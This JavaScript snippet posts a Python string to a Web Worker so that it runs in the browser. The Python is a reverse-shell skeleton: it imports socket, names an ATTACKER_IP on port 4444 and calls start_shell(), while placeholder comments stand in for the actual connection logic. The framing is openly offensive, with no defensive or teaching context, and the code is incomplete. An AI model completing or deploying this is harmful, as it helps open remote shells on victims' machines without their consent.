// 1. Initialize the Web Worker (point this to your worker file, e.g., 'pythonWorker.js')
const pythonWorker = new Worker('py-worker.js');



async function executeCommand() {
    const inputData = document.getElementById('input_data').value;
    const logElement = document.getElementById('output_log');

    logElement.textContent = "Attempting to execute Python in background worker...";

    // 2. Define the Python code string you want to run
    const pythonCodeToRun = `
import socket
# ... (Paste the full connection logic here or define a function) ...
ATTACKER_IP = "172.26.233.12"
PORT = 4444
# ... (rest of the payload logic) ...
# Call the function that encapsulates the connection attempt
print(start_shell()) 
    `;

    // 3. Set up a listener to catch the worker's response
    pythonWorker.onmessage = function(event) {
        const { status, result, error } = event.data;

        if (status === "success") {
            logElement.textContent = `SUCCESS/RETURN VALUE:\n${result}`;
        } else {
            logElement.textContent = `EXECUTION ERROR: ${error}`;
        }
    };

    // 4. Send the Python code payload to the Web Worker
    pythonWorker.postMessage(pythonCodeToRun);
}